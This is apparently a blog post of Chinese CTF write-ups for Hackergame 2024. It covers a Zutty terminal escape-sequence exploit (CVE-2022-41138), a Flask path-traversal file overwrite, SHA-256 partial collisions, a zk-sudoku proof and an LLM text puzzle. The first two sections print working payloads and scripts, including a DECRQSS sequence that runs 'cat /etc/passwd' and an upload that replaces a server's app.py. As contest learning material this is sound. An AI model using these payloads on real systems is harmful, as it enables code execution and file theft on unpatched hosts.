---
title: Hackergame 2024 题解（三）
disableNunjucks: false
mathjax: false
id: 12196
date: 2024-11-09 13:10:29
categories: 
  - CTF题解
tags:
  - Hackergame
  - Hackergame 2024
cover: https://blogfiles.oss.fyz666.xyz/webp/c49ffab9-5549-4d5b-b22e-287c109dfdeb.webp
---

本文是Hackergame 2024 题解的第三部分。

## 动画分享

{% hideToggle 查看题面 %}

{% note primary %}

为了给同学分享动画片，小 T 启动了自己之前用超安全的 Rust 语言写的 Web server，允许你访问「当前目录」的文件，当然了，flag 可不在当前目录。不过因为快到饭点了，小 T 还没来得及复制视频文件到对应的目录，于是就只在自己最常使用的、**几年前编译的某~~祖传~~终端模拟器**里面跑起了自己的 `fileserver`，然后就去锁屏吃饭了。

小 T：「诶，我不过就分享个文件，而且目录里面也没别的东西，所以没关系吧～而且我特地搞了个 chroot，就算我真写出了什么漏洞，你也休想看到我的 flag！」

请提交一个程序，题目环境会在模拟小 T 的环境运行之后，降权运行你的程序：

- 如果你能让小 T 的 `fileserver` 无法正常响应请求（例如让 `fileserver` 退出），你可以获得第一小题的 flag。
- 第二小题的 flag 在 `/flag2`，你需要想办法得到这个文件的内容。

环境限制总 PID 数为 64。

[本题附件](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB/files/%E5%8A%A8%E7%94%BB%E5%88%86%E4%BA%AB.zip)

{% endnote %}

{% endhideToggle %}

这道题是我觉得最有意思的题之一 ~~（别的大佬觉得有意思的题我不会）~~ 这也是我第一次利用现查的CVE去解题。

### 只要不停下 HTTP 服务，响应就会不断延伸

我们要让小 T 的`fileserver`无法正常处理请求，即让下面函数返回`False`:

```python
def health_check() -> bool:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2.0)

        sock.connect(("127.0.0.1", 8000))

        request = f"GET / HTTP/1.1\r\nConnection: close\r\n\r\n"
        sock.sendall(request.encode("utf-8"))

        sock.recv(8192)

        sock.close()

        return True

    except Exception as e:
        # print(f"Error: {e}")
        return False
```

我们看到`fileserver`的源代码：

```rust
use std::fs;
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::path::Path;

fn main() -> std::io::Result<()> {
    let address = "127.0.0.1:8000";
    let listener = TcpListener::bind(address)?;

    println!("Serving HTTP on {}", address);

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                handle_connection(stream);
            }
            Err(e) => {
                eprintln!("Connection failed: {}", e);
            }
        }
    }

    Ok(())
}

fn handle_connection(mut stream: TcpStream) {
    let mut buffer = [0; 1024];
    match stream.read(&mut buffer) {
        Ok(_) => {
            let request = String::from_utf8_lossy(&buffer[..]);

            println!("Received request: {}", request.lines().next().unwrap_or(""));
...
```

看到这里就够了！后面的代码就是很常规的处理HTTP请求。

为什么会注意到这个`println!`函数呢？这还得感谢出题人在题目中的暗示：**几年前编译的某~~祖传~~终端模拟器**。

我在注意到这条暗示之前，尝试了很多其他的方法，例如想通过同时发起一大堆HTTP请求把服务器搞崩之类的，不过统统不奏效。后面才看到了这个暗示，于是我看了一下附件给的其他文件，比如下面这个`Dockerfile`：

```dockerfile
# Uncomment "RUN echo"s, then do this locally for testing:
# docker build -t local/anime .
# cat <YOUR_PAYLOAD> | base64 --wrap=0 | docker run --rm --tmpfs /dev/shm:exec --tmpfs /tmp -i local/anime
FROM ustclug/debian:bullseye AS builder

RUN apt update && apt install -y git build-essential python3-dev pkg-config libfreetype-dev libxmu-dev libgles2-mesa-dev && \
    git clone https://git.hq.sig7.se/zutty.git && cd zutty && git checkout 0.12 && \
    ./waf configure && ./waf

FROM ustclug/debian:bullseye
RUN apt update && apt install -y python3 xvfb libfreetype6 libxmu6 libgles2-mesa libegl1 netcat-openbsd curl
COPY --from=builder /zutty/build/src/zutty /usr/local/bin/zutty
# Start it once to create shader cache
RUN timeout -s 9 5 xvfb-run /usr/local/bin/zutty || true
COPY src/fileserver /usr/local/bin/fileserver

# Start fileserver automatically in zutty :)
RUN echo "cd /root/chroot/ && chroot /root/chroot/ fileserver" > /root/.bashrc && \
    mkdir /root/chroot && cp -r /lib* /root/chroot/ && mkdir -p /root/chroot/usr/ /root/chroot/usr/bin/ /root/chroot/usr/local/bin/ && \
    cp -r /usr/lib* /root/chroot/usr/ && cp -r /usr/bin/* /root/chroot/usr/bin/ && cp -r /usr/local/bin/* /root/chroot/usr/local/bin/
COPY src/ /src/

# Note that you cannot just "cat /flag1" directly on server :)
# RUN echo "Submit your program to get real flag1 on server!" > /flag1 && \
#     echo "Submit your program to get real flag2 on server!" > /flag2

CMD ["python3", "-u", "/src/server.py"]

```

注意到题目里说的终端模拟器是指`zutty`，版本为`0.12`，立刻去查相关的CVE，查到了[这个链接](https://nvd.nist.gov/vuln/detail/CVE-2022-41138)。

> In Zutty before 0.13, DECRQSS in text written to the terminal can achieve arbitrary code execution.

是说如果我们能任意控制打印到`zutty`终端上的内容的话，就可以通过一个叫`DECRQSS`的东西执行任意命令。而这东西是个啥呢？查了一下发现还挺复杂，不过好在刚刚那个网页给了一个有用的[链接](https://bugs.gentoo.org/868495)，这个链接则给了一个利用此CVE的payload，以及`zutty`修复这个CVE的patch：

<img src="https://blogfiles.oss.fyz666.xyz/png/bb300cf1-25f4-44a3-add7-ae52849bcba8.png" alt="image-20241109191608825" style="zoom:50%;" />

这个`poc.txt`的内容如下：

```python
with open('poc.txt', 'rb') as f:
    print(f.read())
    
b'\x1bP$q\ncat /etc/passwd\n\x1b\\\n'
```

也就是说我们可以试图去构造类似于这种样子的payload，让服务端打印出这样的东西，就能执行一些命令了。

搞懂了这些以后，就知道我们需要注意服务端源代码的这一行：

```rust
println!("Received request: {}", request.lines().next().unwrap_or(""));
```

它会把我们发起的请求的第一行打到屏幕上，注意是**第一行**，这也意味着，如果按前面的payload那样在中间插入一些换行符`\n`，就达不到同样的效果，好在我们还可以用`\r`代替`\n`，所以我们可以把payload改成：

```raw
b'\x1bP$q\r???\r\x1b\\\n'
```

不过`???`处要填什么东西可以让服务退出呢？我一开始一直在想有什么让服务退出的命令，结果发过去发现一个都不能运行起来。后来才意识到，文件服务阻塞了终端，你命令能运行就怪了。

然后我想到平时我们自己在终端上让服务停下来，好像一般都是按<kbd>Ctrl</kbd> + <kbd>C</kbd>。查了一下发现这个组合键其实是向终端发送了一个`\x03`。

于是：

```raw
b'\x1bP$q\r\x03\r\x1b\\\n'
```

这样就可以拿到flag1了。

最终的解题代码：

```python
#!/usr/bin/env python3

import socket

payload = b'\x1bP$q\r\x03\r\x1b\\'

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect(('127.0.0.1', 8000))
    s.sendall(payload)

```

### 希望的终端模拟器，连接着我们的羁绊

这一问，我们需要拿到位于服务器根目录的flag2。

很自然想法是，我们现在相当于可以在终端上执行任意命令了，只是看不到终端的输出内容。

```raw
b'\x1bP$q\r\x03\r???\r\x1b\\\n'
```

在`???`处插入任意的命令，应该都可以执行，并且不存在`chroot`限制。

一开始的想法是，我通过一个操作把`/flag2`搬到当前目录，然后重新把`fileserver`启动起来，再向`flieserver`发起一个`GET /flag2`，就行了。结果试了好久才发现这个当前目录居然是只读的。于是这道题卡了小半天。

到了晚上突然想起，我为什么非得用他提供的文件服务呢？我不是还有`Python`？

于是写出下面payload：

```raw
b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\',
```

这样就可以把他的服务干掉以后开一个`Python`的文件服务器，而且可以指定根目录为当前目录。

最终的脚本如下：

```python
#!/usr/bin/env python3

import socket
import time
import re

payloads = [
    b'\x1bP$q\r\x03\rpython3 -m http.server 8080 --directory /\r\x1b\\',
    b'GET /flag2\r\n\r\n'
]


def request(port, payload):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('127.0.0.1', port))
        s.sendall(payload)
        response = b""
        while 1:
            data = s.recv(4096)
            if not data:
                break
            response += data
        return response.decode()


request(8000, payloads[0])
time.sleep(0.5)
flag2 = request(8080, payloads[1])
print(re.search(r'flag\{.*}', flag2).group())

```

使用此脚本可以一次拿俩flag。

## 关灯

{% hideToggle 查看题面 %}

{% note primary %}

3D 版本的关灯游戏。

注：解决这道题不需要很多计算资源，一般的笔记本电脑都是可以完成任务的。最后一问传输数据量较大而且时限很短，为了避免网速的影响，使用了多阶段的题目下载与答案上传机制。

[题目源代码](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%85%B3%E7%81%AF/files/lights_out.py)

{% endnote %}

{% endhideToggle %}

### Easy & Medium & Hard

前三问送分，直接用`z3`：

[解题代码](https://gist.github.com/windshadow233/55180c5e648be86f5ffcb950968e6f24)

第四问复杂度炸了，估计得用什么方法优化，没怎么研究。

## 禁止内卷

{% hideToggle 查看题面 %}

{% note primary %}

（以下剧情均为虚构，请助教和学生都不要模仿！）

XXX 课程实验一内容：

> 本实验需要使用给定的用户评论预测用户对书籍、电影和动画的评分。

> …………（部分省略）

> 我们提供来自诸如某瓣、某某艺、某字母站、某某米等网站的一部分用户评论和评分数据作为训练集，你需要使用这些数据训练模型，来预测对于另一部分给定的评论（测试集），用户会打出怎样的给分。测试集只提供评论数据，不提供评分。用户评分均归一化到 0 到 100 分的整数。

> 对于我们给定的 50000 项的测试集，本实验要求提交对这些测试集你的模型的输出结果，以 JSON 列表的格式输出，列表中每一项是一个 0 到 100 的整数。

> 特别地，为了鼓励同学们互相 PK，我们特别开设了评分网站，提供**前 500 项**的数据测试。诸位可以在做实验的时候提交自己的结果，直接看到自己距离预期分数的平方差，更有榜单功能。

> 实验 DDL：…………（部分省略）

但是这周的实验和作业实在是太多了，太多了，太多了。而且和你同班的有至少 114 个卷王。你刷新着榜单网站，看到榜一越来越小的平方差，陷入了绝望。

不过你的舍友好像之前说他帮这门课助教写了个啥东西（没有加分），好像就是这个网站。你私聊问他要到了源代码，白盒审计的时候发现了不得了的事情……你发现，你不仅可以拿到答案，而且可以搞点破坏，让各位卷王不要再卷了！

本题的 flag 位于评分数据**原始 JSON 文件**的列表头部，将对应的数字加 65 后使用 ASCII 编码转换后即为 flag 文本。

[题目源代码](https://github.com/USTC-Hackergame/hackergame2024-writeups/raw/refs/heads/master/official/%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7/src/web/app.py)

提示：助教部署的时候偷懒了，直接用了 `flask run`（当然了，助教也读过 Flask 的文档，所以 DEBUG 是关了的）。而且有的时候助教想改改代码，又懒得手动重启，所以还开了 `--reload`。启动的完整命令为 `flask run --reload --host 0`。网站代码运行在 `/tmp/web`。

{% endnote %}

{% endhideToggle %}

不知道为啥这题一开始做的人那么少，害得我一直没去看。后来看了一眼，发现极其送分，从开始看源代码到拿到flag，应该不超过10分钟。

源代码如下：

```python
from flask import Flask, render_template, request, flash, redirect, jsonify
import json
import os
import traceback
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(64)

UPLOAD_DIR = "/tmp/uploads"

os.makedirs(UPLOAD_DIR, exist_ok=True)

# results is a list
try:
    with open("results.json") as f:
        results = json.load(f)
except FileNotFoundError:
    results = []
    with open("results.json", "w") as f:
        json.dump(results, f)


def get_answer():
    # scoring with answer
    # I could change answers anytime so let's just load it every time
    with open("answers.json") as f:
        answers = json.load(f)
        # sanitize answer
        for idx, i in enumerate(answers):
            if i < 0:
                answers[idx] = 0
    return answers


@app.route("/", methods=["GET"])
def index():
    return render_template("index.html", results=sorted(results))


@app.route("/submit", methods=["POST"])
def submit():
    if "file" not in request.files or request.files['file'].filename == "":
        flash("你忘了上传文件")
        return redirect("/")
    file = request.files['file']
    filename = file.filename
    filepath = os.path.join(UPLOAD_DIR, filename)
    file.save(filepath)

    answers = get_answer()
    try:
        with open(filepath) as f:
            user = json.load(f)
    except json.decoder.JSONDecodeError:
        flash("你提交的好像不是 JSON")
        return redirect("/")
    try:
        score = 0
        for idx, i in enumerate(answers):
            score += (i - user[idx]) * (i - user[idx])
    except:
        flash("分数计算出现错误")
        traceback.print_exc()
        return redirect("/")
    # ok, update results
    results.append(score)
    with open("results.json", "w") as f:
        json.dump(results, f)
    flash(f"评测成功，你的平方差为 {score}")
    return redirect("/")
```

花里胡哨的算分功能，根本不用看，只要意识到在`/submit`接口有一个路径穿越漏洞就行了，因为它是用`os.path.join`来拼接路径的，所以我们就可以上传一个文件名类似于`../../balabala`这种，我们就基本可以想上传到哪就上传到哪。

注意到题目告诉了我们：网站代码运行在 `/tmp/web`，而且他甚至还开了`--reload`。既然网站是用`flask`写的，那我盲猜一波主文件在`/tmp/web/app.py`，而我们上传的路径在`/tmp/uploads`，所以我们直接上传一个文件`../web/app.py`，这个操作则可以用`requests`实现：

```python
import requests

url = 'https://chal02-drfrs8jw.hack-challenge.lug.ustc.edu.cn:8443/'
file = 'backend.py'

with open(file, 'rb') as f:
    files = {'file': ('../web/app.py', f)}
    response = requests.post(url + 'submit', files=files)

```

而`backend.py`文件中，我们就可以去写拿flag的逻辑了，比如把index路径的请求改了：

```python
@app.route("/", methods=["GET"])
def index():
    with open("answers.json") as f:
        answers = json.load(f)[:100]
    ascii_answers = ''.join(chr(num + 65) for num in answers if isinstance(num, int))
    return ascii_answers
    # return render_template("index.html", results=sorted(results))
```

这样访问网站根路径就可以直接拿到flag。

## 哈希三碰撞

{% hideToggle 查看题面 %}

{% note primary %}

> 以下内容包含 AI 辅助创作

「太奇怪了！」小 Z 盯着显示器愁眉不展。

作为一名密码学家，小 Z 一直为自己能轻松找出哈希碰撞而自豪。毕竟在密码学的江湖中，找到两个不同的字符串却产生相同的哈希值，这种本事可不是人人都有的。

但今天，小 Z 遇到了一个前所未有的挑战。

「找到两个碰撞就像找到双胞胎，」小 Z 自言自语，「可是现在，我需要找到三胞胎？！」

是的，在这个平行宇宙中，仅仅找到两个碰撞已经不够刺激了。作为一名合格的哈希碰撞猎人，你必须找到三个不同的字符串，它们在经过哈希计算后会产生相同的值。

「双胞胎在自然界尚且常见，三胞胎可就是凤毛麟角了。」小 Z 叹了口气。

你能帮助小 Z 找到这个传说中的三碰撞吗？

「在密码学的世界里，两个是巧合，三个才是艺术。」

> AI 辅助创作部分结束

[本题附件](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E5%93%88%E5%B8%8C%E4%B8%89%E7%A2%B0%E6%92%9E/files/hashcol3.zip)

{% endnote %}

{% endhideToggle %}

### 三碰撞之一

最后一个比赛日的晚上，看这题做的人比较多，我也来试试吧！

用ida打开此题的文件：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int i; // [rsp+8h] [rbp-F8h]
  int j; // [rsp+Ch] [rbp-F4h]
  int k; // [rsp+10h] [rbp-F0h]
  int c; // [rsp+14h] [rbp-ECh]
  FILE *stream; // [rsp+18h] [rbp-E8h]
  int v9; // [rsp+24h] [rbp-DCh]
  int v10; // [rsp+28h] [rbp-D8h]
  int v11; // [rsp+2Ch] [rbp-D4h]
  _QWORD v12[4]; // [rsp+30h] [rbp-D0h] BYREF
  char s1[17]; // [rsp+50h] [rbp-B0h] BYREF
  char v14[17]; // [rsp+61h] [rbp-9Fh] BYREF
  char v15[134]; // [rsp+72h] [rbp-8Eh] BYREF
  unsigned __int64 v16; // [rsp+F8h] [rbp-8h]
  __int64 savedregs; // [rsp+100h] [rbp+0h] BYREF

  v16 = __readfsqword(0x28u);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  for ( i = 0; i <= 2; ++i )
  {
    printf("Data %d:", (unsigned int)(i + 1));
    if ( (unsigned int)__isoc99_scanf("%16s", &s1[17 * i]) != 1
      || (unsigned int)hex_to_bin(&s1[17 * i], (__int64)&v12[i], 8uLL) )
    {
      fwrite("Invalid input\n", 1uLL, 0xEuLL, stderr);
      return 1;
    }
  }
  if ( !strcmp(s1, v14) || !strcmp(s1, v15) || !strcmp(v14, v15) )
  {
    puts("Input should be different");
    return 1;
  }
  for ( j = 0; j <= 2; ++j )
  {
    SHA256(&v12[j], 8LL, &v15[32 * j + 30]);
    *(&v9 + j) = 0;
    for ( k = 0; k <= 3; ++k )
      *(&v9 + j) = *((unsigned __int8 *)&savedregs + 32 * j + k - 84) | (*(&v9 + j) << 8);
  }
  if ( v9 == v10 && v10 == v11 )
  {
    stream = fopen("flag1", "r");
    if ( !stream )
    {
      fwrite("Can't open file\n", 1uLL, 0x10uLL, stderr);
      return 1;
    }
    while ( 1 )
    {
      c = fgetc(stream);
      if ( c == -1 )
        break;
      putchar(c);
    }
    fclose(stream);
  }
  else
  {
    puts("Wrong answer");
  }
  return 0;
}
```

但我不太熟悉C语言，这代码看的是真头大。好在一顿分析，我写出了等价的Python代码：

```python
import random
from hashlib import sha256

hexes = ['abcd1234efefcaca', 'deadbeefdeadbeef', '123a4367deadbeef']

v12 = [bytes.fromhex(_) for _ in hexes]
print(v12)
ans = [0, 0, 0]  # v9 v10 v11
v15 = bytearray(b'\x00' * 30)  # -142 -> -8

for j in range(3):
    v15.extend(sha256(v12[j]).digest())
    for k in range(4):
        ans[j] = v15[58 + 32 * j + k] | (ans[j] << 8)
        print(v15[58 + 32 * j + k])
        print(f'{j=},{ans[j]=}')

```

这样看就清晰多了，我们其实只要碰撞`sha256`的最后4个字节就行了，这平均也就只需要碰撞256 ** 4次，似乎是可接受的。

不过这如果用 Python 来写，估计得跑到猴年马月。于是我（在GPT的辅助下）写了个C程序：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/sha.h>
#include <time.h>

void bytes_to_hex(const unsigned char *bytes, size_t len, char *hex_output) {
    for (size_t i = 0; i < len; ++i) {
        sprintf(hex_output + i * 2, "%02x", bytes[i]);
    }
}

int main() {
    char *a = "89629d7e0868d3d9";
    char ans[3][17] = {0};
    strncpy(ans[0], a, 16);

    unsigned char a_bytes[8];
    for (int i = 0; i < 8; i++) {
        sscanf(a + 2 * i, "%2hhx", &a_bytes[i]);
    }

    unsigned char h[4];
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256(a_bytes, 8, hash);
    memcpy(h, hash + SHA256_DIGEST_LENGTH - 4, 4);

    srand((unsigned int)time(NULL));

    int found = 1;
    unsigned long long attempts = 0;
    while (found < 3) {
        // 生成8字节的随机数
        unsigned char b[8];
        for (int i = 0; i < 8; i++) {
            b[i] = rand() % 256;
        }

        unsigned char b_hash[SHA256_DIGEST_LENGTH];
        SHA256(b, 8, b_hash);

        attempts++;

        if (memcmp(b_hash + SHA256_DIGEST_LENGTH - 4, h, 4) == 0) {
            bytes_to_hex(b, 8, ans[found]);
            printf("Found match: %s\n", ans[found]);
            found++;
        }

        if (attempts % 1000000 == 0) {
            printf("Total found: %d, Attempts so far: %llu\n", found, attempts);
        }
    }

    for (int i = 0; i < 3; i++) {
        printf("%s\n", ans[i]);
    }

    return 0;
}
```

实测大约跑了90亿次以后，程序碰出了两个值：

<img src="https://blogfiles.oss.fyz666.xyz/png/101d6739-c85b-413f-81a8-1175afd0f35a.png" alt="image-20241109195444240" style="zoom:50%;" />

---

赛后看[mcfx的题解](https://mcfx.us/posts/2024-11-09-hackergame-2024-writeup/#%E4%B8%89%E7%A2%B0%E6%92%9E%E4%B9%8B%E4%B8%80)，才发现我之前考虑过的方法其实是work的：

```python
from hashlib import sha256
from collections import defaultdict
import os

d = defaultdict(list)
while 1:
    s = os.urandom(8)
    h = sha256(s).digest()[-4:]
    d[h].append(s)
    if len(d[h]) == 3:
        for v in d[h]:
            print(v.hex())
        break

```

但我当时错误的估计了碰撞难度，以为这样会把字典撑爆，故没有实施。后来试了一下发现这方法贼快，而我写C语言强行碰撞90亿次的行为则像个大冤种。

## 零知识数独

{% hideToggle 查看题面 %}

{% note primary %}

一款全新的零知识数独！你已然是数独高手，也终将成为零知识证明大师！

> "If the proof is correct, then no other recognition is needed."

> <cite>— by Grigori Perelman</cite>

**ZK 验证逻辑**

本题的附件中给出了零知识数独电路，以及对应的 Groth16 验证密钥，服务端会使用它保存的谜题（Public Signals）和验证密钥（Verification Key）来验证提交的 Groth16 证明 `proof.json`。你的证明在本地需要满足：

```bash
$ snarkjs groth16 verify verification_key.json public.json proof.json
[INFO]  snarkJS: OK!
```

[本题附件](https://github.com/USTC-Hackergame/hackergame2024-writeups/blob/master/official/%E9%9B%B6%E7%9F%A5%E8%AF%86%E6%95%B0%E7%8B%AC/files/zksudoku.zip)

{% endnote %}

{% endhideToggle %}

零知识证明？这个名词虽然听过，但也算是没接触过的东西，成功把我唬住了，没想到前两问就是送分。

###  数独高手

手玩所有难度即可拿flag。也可以借助[这个网站](http://zh.sudoku.menu/info/solver.html)

### ZK 高手

基本也是解出数独就行，不过需要打包成所谓的零知识证明的什么格式。

打包代码：

```js
const snarkjs = require("snarkjs");
const fs = require('fs');

const input = {
  "unsolved_grid": [
  ],
  "solved_grid": [
  ]
}

function convertNumbersToStrings(arr) {
  return arr.map(row => row.map(num => num.toString()));
}

input.unsolved_grid = convertNumbersToStrings(input.unsolved_grid);
input.solved_grid = convertNumbersToStrings(input.solved_grid);

async function generateProof() {
    const { proof, publicSignals } = await snarkjs.groth16.fullProve(input, "attachment/sudoku.wasm", "attachment/sudoku.zkey");
    fs.writeFileSync('proof.json', JSON.stringify(proof, null, 2));
    console.log('Proof written to proof.json');
    fs.writeFileSync('public.json', JSON.stringify(publicSignals, null, 2));
    console.log('public signals written to public.json');
}

generateProof().catch(err => {
    console.error("Error generating proof:", err);
});
```

把数独题目和解写到最上面的`input`变量里即可。

## 先104🤣」

(原题目名：先不说关于我从零开始独自在异世界转生成某大厂家的 LLM 龙猫女仆这件事可不可能这么离谱，发现 Hackergame 内容审查委员会忘记审查题目标题了ごめんね，以及「这么长都快赶上轻小说了真的不会影响用户体验吗🤣」)

{% hideToggle 查看题面 %}

{% note primary %}

> 以下内容包含 Human 辅助创作

emmmmm 这次事件的背景大概如题所示。具体而言，在某位不幸群友转生成了 [Qwen 2.5-3B](https://modelscope.cn/models/qwen/Qwen2.5-3B-Instruct-GGUF)（还是 8-bit 量化的）后，毫无人道主义关怀的出题人们使用各种超越碳基生物（以及硅基生物）想象力的提示词对其进行了花样繁多的调戏。为了表达自己的不满，这位可怜的 LLM 只好锲而不舍地输出一些关于 Hackergame 的胡话。幸好 Hackergame 内容审查委员会提前部署了分级的内容审查系统（详见题目附件），比如把和 hackergame 相关的字符全部屏蔽成 `'x'` 了：

---

In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.

---

嘛说实话这个审查系统似乎确凿是强了些（虽然它没审查题目标题），所以如果你一定想阅读原文的话估计得自己想办法了。

{% endnote %}

{% endhideToggle %}

### 「行吧就算标题可以很长但是 flag 一定要短点」

大语言模型生成一段关于Hackergame 2024的段落，然后把其中的`hackergame`里的字母全替换成了`x`。

文本：

```raw
In txx xxxnd xxll of Hxxxxxxxxx 2024, wxxxx txx wxlls xxx linxd witx sxxxxns sxowinx txx lxtxst xxploits fxox txx xybxx woxld, xontxstxnts xxtxxxxd in x fxxnzy, txxix xyxs xluxd to txx vixtuxl xxploits. Txx xtxospxxxx wxs xlxxtxix, witx txx sxxll of fxxsxly bxxwxd xoffxx xinxlinx witx txx sxxnt of buxnt Etxxxnxt xxblxs. As txx fixst xxxllxnxx wxs xnnounxxd, x txxx of xxxxxxs, dxxssxd in lxb xoxts xnd xxxxyinx lxptops, spxintxd to txx nxxxxst sxxvxx xoox, txxix fxxxs x xix of xxxitxxxnt xnd dxtxxxinxtion. Txx xxxx wxs on, xnd txx stxxxs wxxx xixx, witx txx ultixxtx pxizx bxinx x xoldxn txopxy xnd txx bxxxxinx xixxts to sxy txxy wxxx txx bxst xt xxxxxinx xodxs xnd xxxxinx systxxs in txx lxnd of txx xisinx sun.
```

当Wordle来做，~~我是Wordle大师。~~

轻松推出原文：

```raw
In the grand hall of Hackergame 2024, where the walls are lined with screens showing the latest exploits from the cyber world, contestants gathered in a frenzy, their eyes glued to the virtual exploits. The atmosphere was electric, with the smell of freshly brewed coffee mingling with the scent of burnt Ethernet cables. As the first challenge was announced, a team of hackers, dressed in lab coats and carrying laptops, sprinted to the nearest server room, their faces a mix of excitement and determination. The game was on, and the stakes were high, with the ultimate prize being a golden trophy and the bragging rights to say they were the best at cracking codes and hacking systems in the land of the rising sun.
```

第二问想到了可能要去搜这个模型的词典，然后写深搜来做，不过其他题太有意思了，就没去实现这个想法。
